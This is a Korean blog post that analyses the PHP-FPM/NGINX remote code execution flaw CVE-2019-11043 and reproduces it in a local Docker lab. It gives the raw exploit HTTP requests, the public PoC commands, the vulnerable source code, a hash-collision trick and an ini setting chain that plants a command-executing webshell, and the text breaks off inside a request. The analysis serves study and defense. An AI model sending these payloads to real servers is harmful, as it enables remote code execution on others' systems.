---
layout: post
title: '[위협] PHP-FPM + NGINX RCE(CVE-2019-11043)'
subtitle: 'threat, php, fpm, nginx'
categories: threat
tags: application
comments: true
---

> 이 글은 어플리케이션 취약점을 분석한 글입니다. 출처: https://paper.seebug.org/1064/
> 출처: https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html

# PHP-FPM + NGINX RCE

- PHP 7+
- CentOS 8

<br>
<br>

PHP-FPM(FastCGI Process Manager)은 동적 페이지를 빠르게 처리하기 위해 NginX, Apache와 연동하여 사용하는 CGI 이다.

해당 취약점은 아래와 같이 잘못된 NginX configuration으로 PHP-FPM을 사용할 경우 발생한다.

![](https://chanbin.github.io/assets/img/php-fpm/1.png)
<center>해당 취약점에 대한 bug fix 내용</center>
> 출처: https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227

## 직접 공격해 보도록 하자. 

취약성을 가진 환경을 만들기 위해, Exploit DB에서 제공하는 `vulhub` 깃에서 도커 이미지를 받아온다.

```bash
[test@localhost Desktop]$ git mkdir test
[test@localhost test]$ git init
[test@localhost test]$ git config core.sparseCheckout true
[test@localhost test]$ git remote add -f origin https://github.com/vulhub/vulhub
[test@localhost test]$ echo "php/CVE-2019-11043" >> .git/info/sparse-Checkout
[test@localhost test]$ git pull origin master
[test@localhost test]$ mv -v CVE-2019-11043/ /home/유저아이디/Desktop/
[test@localhost test]$ rm -rf test
[test@localhost CVE-2019-11043]$ sudo docker-compose up -d # 도커는 계정별 설치. 일반 사용자에 설치했다면 sudo를 빼보자
```

![](https://chanbin.github.io/assets/img/php-fpm/2.png)
<center>취약한 환경 구축</center>
 
Github에서 PoC 코드를 다운받아 공격 명령을 실행해본다.<br>해당 코드는 `golang`으로 작성되었다. 
```bash
[test@localhost Desktop]$ sudo vi /etc/resolv.conf
nameserver 8.8.8.8 추가
[test@localhost Desktop]$ wget https://dl.google.com/go/go1.13.5.linux-amd64.tar.gz
[test@localhost Desktop]$ tar -xzf go1.13.5.linux-amd64.tar.gz
[test@localhost Desktop]$ sudo mv go /usr/local
[test@localhost Desktop]$ mkdir test
[test@localhost Desktop]$ export GOROOT=/usr/local/go
[test@localhost Desktop]$ export GOPATH=$HOME/Desktop/test
[test@localhost Desktop]$ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
# 환경변수를 유지하기 위해서는 ~/.bash_profile 파일에 입력해야 한다.
[test@localhost test]$ go get -v github.com/neex/phuip-fpizdam
[test@localhost test]$ go install github.com/neex/phuip-fpizdam
[test@localhost Desktop]$ phuip-fpizdam http://127.0.0.1:8080/index.php
[test@localhost test]$ 
```

![](https://chanbin.github.io/assets/img/php-fpm/3.png)
<center>취약점을 통해 파일 작성 후 원격 코드 실행 화면</center>

## 취약점에 대한 간단한 설명을 먼저 해보자.
  
```xml 
GET /index.php/PHP_VALUE%0Asession.auto_start=0;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
D-Pisos: 8========================================================================================================================================================================================================================================================D(250자)
Ebut: mamku tvoyu
```  
1. `Nginx`에서 사용자의 `Request`를 파싱하는 `FastCGI Process Manager`에 정의되어있는 `fastcgi_split_path_info` 정규표현식의 취약점을 사용할 수 있도록, 공격 URI에 `개행`문자를 삽입한다. 해당 문자열은 `PATH_INFO(env_path_info)`에 삽입된다.
2. `fastcgi_split_path_info`정규 표현식 처리 실패로 `env_path_info`가 `NULL`이 된다
3. `[1141번째 줄]path_info = env_path_info ? env_path_info + pilen - slen : NULL`구문을 통해 `path_info`변수가 특정 `Underflow`값으로 초기된다.
4. `path_info`가 특정 주소를 가리킬 수 있게 되었고, `[1222번째 줄]path_info[0] = 0`구문을 통해 특정주소의 첫번재 바이트를 `0x00`으로 설정이 가능해진다.
5. `Nginx`와 `FastCGI`가 통신할때 사용하는 전역변수가 들어있는 CGI 환경구조체-`fcgi_data_seg`의 현재위치 `pos` 주소를 `path_info`가 가리키도록 설정한다.(추후 공격시, `path_info`값을 `pos`주소까지 성공적으로 맞춘다면, set-cookie 헤더를 확인할 수 있다.)
6. `FCGI_PUTENV(char *name, char *value)`는 `fcgi_data_seg`구조체에서 `hash_value`를 검색하고, 메모리 힙에 로드된 해쉬버킷`(fcgi_hash_bucket)`값을 `char *value`와 `fcgi_hash_set`함수로 수정하는 함수이다.
7. `fcgi_hash_buckt`의 `hash_value`에 대한 제 2 역상 공격을 통해 `PHP_VALUE`와 동일한 해시값을 가진 더미헤더 `HTTP_EBUT`을 찾아낸다.
8. 공격 Request에서 `D-Fisos`헤더는 `Ebut`헤더가 특정위치에 들어갈 수 있도록 자리를 차지하는 역할이며, `Ebut`은 `fastcgi_params`에 정의된 값에 의해 전역변수 `HTTP_EBUT`으로 자동으로 바뀐다
9. 6번 과정을 자세히 설명하자면, `FCGI_PUTENV`의 `fcgi_hash_set`함수는 특정 헤시테이블의 `has_value`와 변수이름의 `길이`가 동일할 때, 새로운 변수와 값으로 덮어쓸 수 있다.
10. 메모리 힙에서 `HTTP_EBUT`이 올라갈 주소를 `D-Fisos`헤더를 통해 수정된 `fcgi_data_seg->pos`주소와 `같은 버퍼(fcgi_data_seg)`안에 위치하도록 `유도`하고, 수정된 `fcgi_data_seg->pos` 값과 `[1226번째 줄]FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name)` 구문을 통해 `"PHP_VALUE\nsessi.."`를 포함한 나머지 CGI 환경구조체가 작성된다면, `HTTP_EBUT`과 해당`값`은 `PHP_VALUE`와 `%0A로 구분되어지는 값`으로 덮어씌어 진다(`PUT`).
11. 물론, PHP FastCGI Process Manager는 `HTTP_EBUT`과 `PHP_VALUE`의 `hash_value, var_len`이 동일하여 같은 헤더로 인식했기 때문에 가능하다.
12. `[1326번째 줄]ini = FCGI_GETENV(request, "PHP_VALUE")` 구문을 통해 헤쉬버킷`(fcgi_hash_bucket)`에서 `변조된 PHP_VALUE(전 HTTP_EBUT)`를 검색하여 `ini stuff`변수로 가져오며, 이를 `PHP ini`파일에 작성한다.
13. `PHP ini`에 작성하려는 값을 공격 체인을 통해 구성한다면, 원격 명령 제어를 위한 설정을 만들 수 있다. 또한 이를 통해, 다양한 원격 명령 실행이 가능하다.

* 공격 페이로드는 [여기로](https://chanbin.github.io/threat/2019/12/26/php-fpm-payload)가면 볼 수 있다.


## 이제 제대로 분석하자. (여기서 부터 재공사중 - 논리가 부실함)

취약점 패치 내역을 다시 보면 `path_info` 변수의 조건에 문자열 길이 필터를 추가하여, false 값으로 유도하지 못하게 하고있다.

![](https://chanbin.github.io/assets/img/php-fpm/1.png)
<center>해당 취약점에 대한 bug fix 내용</center>
> 출처: https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227

취약점 제보자의 문서를 찾아보면 `fastcgi_split_path_info` 지시문의 정규표현식은 개행 문자(\n,%0A)를 사용하여 해제할 수 있다. 정규표현식이 제대로 작동하지 않으므로 `PATH_INFO($fastcgi_path_info)`는 취약점의 트리거가 될 수 있다라고 나온다.

> The regexp in `fastcgi_split_path_info` directive can be broken using the newline character (in encoded form, %0a). Broken regexp leads to empty PATH_INFO, which triggers the bug.

```xml
# NGINX configuration 파일

location ~ [^/]\.php(/|$){
	fastcgi_split_path_info ^(.+?\.php)(/.*)$;
	include fastcgi_params;

	fastcgi_param PATH_INFO 	$fastcgi_path_info;
	fastcgi_index index.php;
	fastcgi_param REDIRECT_STATUS 	200;
	fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;
	fastcgi_param DOCUMENT_ROOT /var/www/html;
	fastcgi_pass php:9000;
}
```
`fastcgi_split_path_info`의 정규표현식을 보면 첫 글자가 dot(.)이다. dot은 개행 문자(\n)를 제외한 임의의 한 문자를 의미하므로, 개행 문자가 들어온다면 변환에 실패한다.

<strong>`[컨셉]`</strong> 수정되기전 소스코드를 보면, `path_info = env_path_info ? env_path_info + pilen - slen : NULL;`는 `path_info`값을 공격자가 원하대는 대로 설정할 수 있다는 뜻이다.<br>
* 참고로, C언어에서 `변수선언 = 조건? 참 : 거짓;`라는 문법이 존재한다. 조건이 참일 시 콜론(:)앞의 값으로 선언이, 거짓일 시 콜론 뒤의 값으로 선언이 이루어 진다.

소스코드를 자세히 보면,
```c
# php-src/sapi/fpm/fpm/fpm_main.c 파일
		...
989		char *env_path_info = FCGI_GETENV(request, "PATH_INFO");
		...
1108	char *pt = estrndup(script_path_translated, script_path_translated_len);
1109	int len = script_path_translated_len;
		...
1131	int ptlen = strlen(pt);
1132	int slen = len - ptlen;
1133	int pilen = env_path_info ? strlen(env_path_info) : 0;
1134	int tflag = 0;
1135	char *path_info;
1136	if (apache_was_here) {
1137		/* recall that PATH_INFO won't exist */
1138		path_info = script_path_translated + ptlen;
1139		tflag = (slen != 0 && (!orig_path_info || strcmp(orig_path_info, path_info) != 0));
1140	} else {
1141		path_info = env_path_info ? env_path_info + pilen - slen : NULL;
1142		tflag = path_info && (orig_path_info != path_info);
1143	}
		...
```

1. `env_path_info` 선언에서, FastCGI 모듈의 환경변수를 가져오는 FCGI_GETENV함수를 사용한다. 이는 클라이언트의 요청값에서 `PATH_INFO`의 문자열(fastcgi_path_info, 실제 요청 URI) 주소값을 가져와야 하지만, 개행 문자에 의해 `fastcgi_split_path_info` 정규 표현식을 거치면서 문자열 처리에 실패하고, NULL값으로 설정된다.
2. 클라이언트의 잘못된 요청으로 `path_info`가 변조되면 `1133번째 줄`은 참이지만, `strlen(NULL)=0`이므로 `pilen = 0`이 된다. 
3. `script_path_translated`는 클라이언트가 요청한 URI를 서버상의 PHP파일 경로(`SCRIPT_FILENAME`, `/var/www/html$fastcgi_script_name`)로 저장한 문자열이다. `pt`는 `script_path_translated`문자열을 `strrchr`함수로 자른 문자열이다. 해당 함수를 사용하여 `/` 또는 `\\`를 찾아서 문자열을 자른다. 쉽게 말하자면, `pt`는 request에서 파라미터를 뺀 `순수 URI`이다
4. `slen`은 `script_path_translated`의 길이에서 `pt`의 길이를 뺀, 클라이언트가 요청한 URI에서 `파라미터의 길이`이다.


요청 URL이 `http://127.0.0.1/index.php/123%0Atest.php` 와 같다면, 아래의 내용으로 정리할 수 있다.
```c
# php-src/sapi/fpm/fpm/fpm_main.c 파일
		...
989		char *env_path_info = NULL;
		...
1108	char *pt = "/var/www/html/index.php";
		...
1131	int ptlen = strlen("/var/www/html/index.php");
1132	int slen = strlen("/var/www/html/index.php/123\ntest.php")
				 - strlen("/var/www/html/index.php"); // strlen("/123\ntest.php")
1133	int pilen = 0; // path_info에서 %0A로 인한 0값 설정
1134	int tflag = 0;
		...
1140	else {
1141		path_info = env_path_info ? env_path_info + pilen - slen : NULL;
			// env_path_info==NULL, NULL=num이므로 참
			// path_info = NULL + 0 - strlen("/123\ntest.php") == 음수
1142		tflag = path_info && (orig_path_info != path_info);
1143	}
		...
```

<strong>`[컨셉 - 결과]`</strong> `pilen`은 0이 되었고, `slen`은 URI를 뺀 파라미터의 길이가 되었기 때문에, `path_info`는 NULL이 아닌 음의 값을 가질 수 있다. 개행문자가 들어간 매우 긴 파라미터를 이용해 Underflow를 만들어 낼 수 있으며 `특정 주소값`을 가리키도록 할 수 있다.(ex: 0x55c8cc0e7500)

```c
# php-src/sapi/fpm/fpm/fpm_main.c 파일
		...
1151	path_info[0] = 0;
1152	if (!orig_script_name ||
1153		strcmp(orig_script_name, env_path_info) != 0) {
1154		if (orig_script_name) {
1155		FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name);
1156		}
1157		SG(request_info).request_uri = FCGI_PUTENV(request, "SCRIPT_NAME", env_path_info);
1158	} else {
1159		SG(request_info).request_uri = orig_script_name;
1160	}
		...
```

`1151번째 줄`의 `path_info[0] = 0;`을 통해, `PATH_INFO` 다음의 어떤 특정주소의 값을 `0x00`으로 바꿀 수 있다.

### PHP-FPM의 CGI environment는(path_info를 포함하는 사용자의 요청에 의한 서버의 응답) `fcgi_data_seg`구조체에 저장이 되며, `fcgi_hash`구조로 관리된다.

```c
typedef struct _fcgi_hash {
    fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];
    fcgi_hash_bucket  *list;
    fcgi_hash_buckets *buckets;
    fcgi_data_seg     *data; // fcgi_data_seg 구조체
} fcgi_hash;

typedef struct _fcgi_data_seg {
    char                  *pos;
    char                  *end;
    struct _fcgi_data_seg *next;
    char                   data[1];
} fcgi_data_seg;
```

`fcgi_data_seg->pos`는 현재 버퍼의 주소이며<br>
`fcgi_data_seg->data`는 PHP-FPM이 데이터를 작성해야할 다음 주소이며,<br>
`fcgi_data_seg->end`는 현재 버퍼의 끝이다.<br>
만약 `pos`가 `end`보다 커진 경우, PHP-FPM은 새로운 `fcgi_data_seg`버퍼를 생성하고, 이전 버퍼는 `fcgi_data_seg->next`에 작성한다.

`path_info`변수를 현재`fcgi_data_seg->pos`의 주소와 동일한 값으로 설정하면(Underflow값을 통해 임의의 주소 작성이 가능), `path_info[0]=0`구문을 실행하면서 `pos`의 첫번째 바이트를 `0x00`으로 변환하게 된다.

이렇게 되면 `fcgi_data_seg->pos`는 구조체의 중간으로 이동하게 되며, `FCGI_PUTENV`함수가 실행될 때 기존 CGI환경을 덮어쓰게 된다.

운좋게도, 널바이트 작성 바로 뒤에 `FCGI_PUTENV`가 존재한다. 이 함수는 우리가 변조한 설정을 `PHP ini`파일에 작성하도록 도와준다.
```c
# php-src/sapi/fpm/fpm/fpm_main.c 파일
		...
1151	path_info[0] = 0;
1152	if (!orig_script_name ||
1153		strcmp(orig_script_name, env_path_info) != 0) {
1154		if (orig_script_name) {
1155		FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name);
1156		}
		...
1324	/* INI stuff */
1325	ini = FCGI_GETENV(request, "PHP_VALUE");
1326	if (ini) {
1327		int mode = ZEND_INI_USER;
1328		char *tmp;
1329		spprintf(&tmp, 0, "%s\n", ini);
1330		zend_parse_ini_string(tmp, 1, ZEND_INI_SCANNER_NORMAL, (zend_ini_parser_cb_t)fastcgi_ini_parser, &mode);
1331		efree(tmp);
1332	}
		...
```
널 바이트 작성 후, PHP-FPM은 1325번째 줄과 같이 HTTP HEADER에서 `PHP_VALUE`라는 환경변수를 검색(`GETENV`)하여 `PHP stuff`를 초기화한다. 이 stuff는 1329번째 줄에서 `PHP ini`파일에 작성되며, `stuff`는 렌더링 과정에서 아래와 같이 php 코드를 실행할 수 있다. 이 `stuff`를 변조한다면 RCE환경이 완성된다.
```php
# php stuff 예시
# 출처: https://bepa.tistory.com/54
header{
	background: url("<?php echo $CDNURL; ?>/images/header-bg.png") no-repeat;
}

a {
	color: <?php echo $linkColor; ?>;
}

...

ul#main-nav li a{
	color: <?php echo $linkColor; ?>;
}

```

다시 `path_info[0] = 0`으로 돌아와서,<br>
`PHP_VALUE`의 값을 변경하기 위해, 기존 CGI 환경에 새로운 `fcgi_data_seg`구조체를 덮어쓰더라도, `PHP_VALUE`로 적용하려면 `PHP_VALUE`라는 문자열의 해시값을 알아야한다.

PHP-FPM은 환경변수들의 이름을 해시로 변환하여 `fcgi_hash_bucket`에 가지고 있다. 이 해시테이블을 손상시켜야만 우리가 원하는 새로운 환경변수를 작성할 수 있다. 물론, `bucket`은 `fcgi_data_seg`를 관리하는 `fcgi_hash`구조체에서 관리한다.

```c
typedef struct _fcgi_hash_bucket {
    unsigned int              hash_value;
    unsigned int              var_len;
    char                     *var;
    unsigned int              val_len;
    char                     *val;
    struct _fcgi_hash_bucket *next;
    struct _fcgi_hash_bucket *list_next;
} fcgi_hash_bucket;
```

PHP-FPM은 환경변수를 검색하기 전에 해당 변수의`hash`값이 존재하는지 검사한다. 다음으로는 `hash_value`, `var_len`, `var`를 확인한다. `var`는 환경변수의 값으로, 앞선 HTTP요청을 통해 변조할 수 있지만 `hash_value`와 `var_len`은 해쉬 알고리즘을 분석해서 위조해야 한다.
```c
static char *fcgi_hash_get(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int var_len, unsigned int *val_len)
{
    unsigned int idx = hash_value & FCGI_HASH_TABLE_MASK;
    fcgi_hash_bucket *p = h->hash_table[idx];

    while (p != NULL) {
        if (p->hash_value == hash_value &&
            p->var_len == var_len &&
            memcmp(p->var, var, var_len) == 0) {
            *val_len = p->val_len;
            return p->val;
        }
        p = p->next;
    }
    return NULL;
}
```

PHP-FPM의 해쉬알고리즘은 단순하다.
```c
#define FCGI_HASH_FUNC(var, var_len) \
    (UNEXPECTED(var_len < 3) ? (unsigned int)var_len : \
        (((unsigned int)var[3]) << 2) + \
        (((unsigned int)var[var_len-2]) << 4) + \
        (((unsigned int)var[var_len-1]) << 2) + \
        var_len)
```

`PHP_VALUE` 문자열을 예시로 들어보자. `var_len`이 3보다 크다는 가정하에(환경변수의 이름은 대부분 3보다 크다)<br>
 해시값은 `('_'<<2) + ('U'<<4) + ('E'<<) + 9 = 2015`이다.<br>

해당 해쉬와 동일한 가짜 문자열은 공격에 사용되었던 `HTTP_EBUT`이며,<br>
해시값은 `('P'<<2) + ('U'<<4) + ('T'<<2) + 9 = 2015`이 된다.<br>
`hash_value(2015)`와 `var_len(9)`이 동일하기 때문에, PHP-FPM은 `PHP_VALUE`와 동일한 값으로 인식한다.

이를 통해, `hash_value`, `var_len`, `var` 등이 해결되었고, 위조된 `PHP_VALUE`값으로 `PHP stuff`를 변조하여 `PHP ini`파일에 원격 코드를 삽입할 수 있다.

삽입하는 문자열은 아래와 같이 공격체인(var `chain`)으로 연결하여, 명령 제어를 위한 설정을 만들 수 있다.
```php
var chain = []string{
    "short_open_tag=1", # php태그를 <?php 대신에 <?로 줄여서 사용, 문자열 탐지 우회 가능, 문자열 길이 축소
    "html_errors=0", # 에러 메세지에 HTML태그 추가여부 설정, off
    "include_path=/tmp", # PHP의 다양한 함수가 파일을 찾는 기본 디렉토리 설정
    "auto_prepend_file=a", # HTML 문서 전후에 추가할 파일설정
    "log_errors=1", # 로그파일에 에러로그 기록하도록 설정
    "error_reporting=2", # 에러로그 E_ERROR(2)만 기록하도록 설정
    "error_log=/tmp/a", # "/tmp/a" 파일에 에러 기록
    "extension_dir=\"<?=`\"", # 확장모듈 디렉토리 설정
    "extension=\"$_GET[a]`?>\"", # 해당 디렉토리에서 PHP가 시작할 때, 읽어들일 모듈 설정
}
```
extension_dir = "<?=\`" <br>
extension = "$\_GET[a]\`?>" <br>
두개를 더하면 = "<?=\`$\_GET[a]\`?>"
이 문자열은, `PHP INI`파일의 `ini stuff`가 되고, 렌더링 과정에서 command로 실행하고, 결과값을 에러로 출력한다.
```bash
# errorlog 예시
[27-Oct-2019 13:55:05 UTC] PHP Warning:  Unknown: Unable to load dynamic library '$_GET[a]' (tried: `?>.php/$_GET[a] (`?>.php/$_GET[a]: cannot open shared object file: No such file or directory), `?>.php/$_GET[a].so (`?>.php/$_GET[a].so: cannot open shared object file: No such file or directory)) in Unknown on line 0
```
결과적으로 
1. 파라미터`a`로 명령어를 받고,
2. 렌더링과정에서 확장모듈을 가져올때 `$_GET[a]`가 작동하지만, `에러로그`로 출력되고,
3. 에러로그는 `/tmp/a`파일에 기록되고,
4. 해당파일은 HTML문서에 추가되어 출력된다.

##  실제 공격 코드를 분석해보자. 

위의 분석내용을 실제 공격에 사용하기 위해선 3가지 제약사항이 있다.

### 1. Nginx 구성

PHP는 Nginx에서 독립된 패키지 이므로, Nginx가 PHP 스크립트를 처리하도록 하려면 구성에 몇가지 설정이 필요하다.
1. `PATH_INFO`가 제공되어야한다. Nginx configuration에서 `fastcgi_param PATH_INFO $xxxx` 문구가 기본 기능에 포함되지 않는다.
2. PHP-FPM에 요청을 보내기 위해 관리자는 location의 정규표현식을 URI에 맞도록 변경해한다. location 정규표현식은 일반적으로 2가지가 있다.  
```php
# Nginx 공식 설명서의 설정
location ~ [^/]\.php(/|$) {
    # ...
}

# 현재 리눅스에서 기본 설정
location ~ \.php$ {
    # ...
}

두가지는 비슷해보이지만 공격코드는 완전히 달라진다.
```  
3. 파일이 존재하는지 확인하는 기능을 지워야한다. 기본적인 Nginx환경에서 아래와 같이 파일이 존재하는지 확인하고 PHP-FPM에 보낸다. 또는 확장성이나 성능 문제로 Nginx와 PHP-FPM이 동일한 서버에 있지 않다면, 경로가 달라 파일을 확인하지 못한다.  
```php  
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    ...
    if (!-f $document_root$fastcgi_script_name) {
        return 404;
    }
    ...
    or
    ...
	try_files $fastcgi_script_name =404;
    ...
}
```  
4. 기본적인 공격의 컨셉은 `QUERY_STRING`의 길이를 증가시켜 버퍼를 조정하고 언더플로우 시키는 것이다. 하지만 `PATH_INFO`가 `QUERY_STRING`보다 먼저 온다면 `PATH_INFO`의 정규표현식에 잘려서 공격이 성공하지 못한다. 예시는 아래와 같다.  
```php
# /etc/nginx/sites-enabled/nginx.conf 

location ~ \.php$ {
      include snippets/fastcgi-php.conf; <---
      # With php7.0-cgi alone:
      fastcgi_pass 127.0.0.1:9000;
      # With php7.0-fpm:
      fastcgi_pass unix:/run/php/php7.0-fpm.sock;
}

# /etc/nginx/snippets/fastcgi-php.conf

# regex to split $uri to $fastcgi_script_name and $fastcgi_path
fastcgi_split_path_info ^(.+\.php)(/.+)$;

# Check that the PHP script exists before passing it
try_files $fastcgi_script_name =404;

# Bypass the fact that try_files resets $fastcgi_path_info
# see: http://trac.nginx.org/nginx/ticket/321
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;

fastcgi_index index.php;
include fastcgi.conf; <---

# /etc/nginx/fastcgi.conf

fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
```

사실 Nginx 환경설정이 취약성에 큰 영향을 미친다. `1번과 3번`은 우회하기 매우 힘들고, `2번과 4번`은 어느정도 가능하다. 해당 내용은 아래의 취약점 검증에서 더 자세히 설명한다.

그러나 `Ubuntu(16.04/18.04)`에서 Nginx와 PHP-FPM을 `apt`사용해 설치한다면, 3번의 `try_files`구문만 삭제하는걸로 대부분의 시스템을 취약하게 만들 수 있다.
 
### 2. 취약점 검증

공격을 수행하기 전에, 원격지에 있는 Nginx의 환경파일을 알 수 없으므로 환경파일을 덮어쓸 방법을 찾아야한다.<br>
앞서 말했듯이, PHP-FPM은 `fcgi_data_seg`의 `pos`가 `end`보다 클 경우 새로운 버퍼를 생성하고, 이전 구조체는 `next`에 넣는다.<br>
`pos`값을 키우기 위해 `QUERY_STRING`에 매우 긴 문자열`(Q...)`을 보내 PHP-FPM이 새 버퍼를 할당하도록 하고, PHP-FPM이 새 버퍼에 `PATH_INFO`를 작성하도록 한다.

`PATH_INFO`가 `fcgi_data_seg->data`의 상단에 있는 한, `fcgi_data_seg->pos`까지의 오프셋은 `34`이다. HTTP 요청에서 underflow로 `PATH_INFO`의 값을 `*PATH_INFO+34`로 맞추면 `fcgi_data_seg->pos`에 널바이트를 설정할 수 있다.(기본 HTTP_HEADER 삭제)<br>
또한, `PHP_VALUE`값 수정을 위한 충분한 길이의 더미 헤더(HTTP_DUMMY_HEADERSSS 또는 D-Pisos)와 그 값('A' 11번 반복 또는 8=====...====D)을 HTTP 요청에 작성했다면, `PHP_VALUE`의 값을 `HTTP_EBUT`을 통해 `PHP_VALUE\nsession.auto_start=1;;;`등으로 정확하게 덮어쓸 수 있다.   
```bash  
GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ